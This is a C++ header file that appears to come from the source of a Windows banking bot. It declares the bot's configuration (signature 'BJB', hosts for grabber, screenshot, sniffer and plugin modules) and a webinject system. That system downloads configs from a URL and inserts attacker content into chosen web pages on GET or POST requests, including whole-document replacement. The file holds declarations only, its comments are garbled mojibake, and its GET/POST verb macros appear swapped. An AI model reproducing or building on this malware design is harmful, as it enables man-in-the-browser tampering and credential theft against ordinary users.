// -----------------------------------------------------------------------------

#ifndef BotConfigH
#define BotConfigH

// � ���������� ����������� ���������� �������� �� �������, ��� �
// ������ ������ ���������/���������� HTKL �������� ��������� � ���� ������
#define HTMLInjectsH

// -----------------------------------------------------------------------------

#include <windows.h>
#include "Requests.h"
#include "BotClasses.h"
#include "Requests.h"


#define VERB_IS_POST hmGET
#define VERB_IS_GET  hmPOST

#define MAX_POST_DATA_SIZE 5000
#define MIN_POST_DATA_SIZE 5



#define FGRHOSTFROMCFG		1
#define GRAHOSTFROMCFG		2
#define SCRHOSTFROMCFG		3
#define SNIHOSTFROMCFG		4
#define PLUGINSHOSTFROMCFG	5


const static char ConfigSignature[] = {'B', 'J', 'B', 0};

DWORD GetConfigTimeOut();
char* GetCurrentHostFromConfig(int Num);
void GetCurrentConfigHostSetings(bool*http, bool*https);


//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//
//  ������ ��� ������ � ���������������� ������ ����
//
//
//  �����!!!!!! ��������� ����� ������� �������� ������ ��� ����������
//              ����������
//				�������� ��� BV_APP � ����� ������������
//
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

enum TInjectDataState {idsUnknown, idsOk, idsError};

typedef struct THTMLInjectData
{
	PCHAR Before;
	PCHAR Inject;
	PCHAR After;
	TInjectDataState State;
    DWORD MacrosHash;  // ��� ������  ��� ����������� ������� �������
	bool Disabled;     // �� ������������ ������ (��� ���������� ���������)
	LPVOID Owner;      // ��������� �� ������ �������� ������
	DWORD  ID;         // �������������, ��� ���������� ����

}*PHTMLInjectData;


//---------------------------------------------------------
//  THTMLInject - �������� ������ ��� ��������� ������
//                    HTML ���� � ����������� ��������
//---------------------------------------------------------
typedef struct THTMLInject
{
	PCHAR URL;       // ����� ����� ��� �������� ���������� ������������ ��������
	bool GET; 		 // ������������ GET �������
	bool POST;       // ������������ POST �������
	bool IsLog;      // ���������� HTML. ������ ������� ���������� ������ �� ������
	PList Injects;   // ������ �������� (������ ��������� ���� PHTMLInject)
	bool Disabled;   // �� ������������ ������ (��� ���������� ���������)
	bool Used;       // ������� ���� ��� ����� ��������������
	DWORD RefCount;  // ���������� ������� ���������� �������
	bool DestroyAfterRelease; // ���������� ������ ����� ��������� ��������
	DWORD  ID;       // �������������, ��� ���������� ����
	#ifdef BV_APP
		PCHAR Comment;   // ���������� � �������, ������ ��� ���������
	#endif
} *PHTMLInject;


//---------------------------------------------------------
// TBotConfig -  ��������� ������ ����
//---------------------------------------------------------
typedef struct TBotConfig
{
	PList HTMLInjects;          // ������ �������� (������ ��������� ���� PHTMLInject)
	RTL_CRITICAL_SECTION Lock;  // ����������� ������ ���������� �������
	PWCHAR LastConfigFile;      // ��� ���������� ������������ �����
	FILETIME ConfigTime;        // ����� ��������� ������������ �����
} *PBotConfig;



//*********************************************************
//  SetHTMLInjectEvent - ���������� ����� ���������
//		������� HTML �������
//*********************************************************
// �����, ������� HTML �������
#ifdef BV_APP
	enum THTMLInjectEventID {injCustom, injMaskFinded, injDataHandled};
	typedef void(*THTMLInjectEvent)(LPVOID Data,        	// ������� � �������� ���������������� �������
									LPVOID Sender, 	    	// �������� �������
									THTMLInjectEventID ID,  // ������������� �������
									LPVOID Reserver);      	// ���������������

	void SetHTMLInjectEvent(LPVOID Data, THTMLInjectEvent Event);
#endif

namespace Config
{
	// ������� ������ ��������� �������
	PBotConfig Create();

	// ������� ���������� ��������� �������
	void Free(PBotConfig Cfg);

	//*********************************************************
	//	Initialize - ���������������� ����������
	//  	��������� ����. ���� ������ ��� ����� FileName ��
	//  	��������� ����� ��������� �� ����, � ���������
	//  	������ ��������� ����� ��������� �� ����� �������
	//		� ��� ����.
	//*********************************************************
	PBotConfig Initialize(PWCHAR FileName, bool IsNewApplication, bool DontLoad);

	// ������� ���������� ��������� �� ������ ����
	PBotConfig GetConfig();

	// �������� ������
	void Clear(PBotConfig Config);

	//  ������� ���������� ��� ����� �� ���������
	//
	PWCHAR GetFileName(bool HightPriority = false);

	//  ������� ������������� ��� ����� �� ���������
	void SetFileName(PWCHAR FileName);

	// ��������� ������
	bool Download(PCHAR URL);

	// ������� ���������� ������ ���� ����� �������� ��������
    bool IsConfig(PCHAR Buf);

	//  GetInjectsForRequest - �������� ������� ��� �������
	bool GetInjectsForRequest(PRequest Request);

	// ������� ��������� ���� �� ��� ���������� ������ ������
	bool IsInjectURL(PCHAR URL, THTTPMethod Method);

	// ������� ��������� ������ �� �����
	bool LoadConfigFromFile(PBotConfig Config, PWCHAR FileName);
}


// HTML_INJECT_MACROS - HIM

#define HIM_REPLACE_DOCUMENT 0x6A665EA5 /* $REPLACE_DOCUMENT$ */


//****************************************************************************
//	HTMLInjects - ������ ��� ������ � HTML ���������
//****************************************************************************
namespace HTMLInjects
{
	//*********************************************************
	// ������� ���������� ������ ���� ������ ����� ������������
	// � ��������
	//*********************************************************
	bool IsValidInjectData(PHTMLInjectData Data);


	//*********************************************************
	//  ��������� HTML �������.
	//
	//  ��������� - ������� ���������� ������ ���� � ������
	//              ������� ���� ������� ���������
	//*********************************************************
	bool Execute(PRequest Request, PHTTPSessionInfo Session);

	//*********************************************************
	// ������� ���������� ������ ���� ��������� ��� ��������
	// �������������� �������� ������� HTML
	//*********************************************************
	bool SupportContentType(PCHAR CType);

	//*********************************************************
	//  AddInject - �������� ����� HTML ������ � ������
	//		List. ���� ������ �������� Source �� � �����
	//		����� ����������� ��� ��� ������
	//*********************************************************
	PHTMLInject AddInject(PList List, PHTMLInject Source, bool IgnoreDisabledData = false);

	//*********************************************************
	//  AddInjectData - �������� ����� ������ �������
	//                      ��������� ������ �������, ������
	//						���� ��������
	//*********************************************************
	PHTMLInjectData AddInjectData(PHTMLInject HTMLInject, PCHAR Before, PCHAR After, PCHAR Inject);

	//*********************************************************
	//  ResetStatus - �������� ������ ��������
	//*********************************************************
	void ResetStatus(PList Injects);

	//*********************************************************
	//  ClearInjectList - ������� ������� ������ ����������
	//		 			  �������� ���� THTMLInject
	//*********************************************************
	void ClearInjectList(PList List);

	//*********************************************************
	//  ������ ����������� ������ HTML �������
	//*********************************************************
	void FreeInject(PHTMLInject Inject);

	//*********************************************************
	// ReleaseInjectsList - ������� ����������� ������ ��������
	//                      ������� ���� �������� ��� �������
	// List - ������ ���������� ��������
	//*********************************************************
    void ReleaseInjectsList(PList List);
}

// -----------------------------------------------------------------------------
#endif
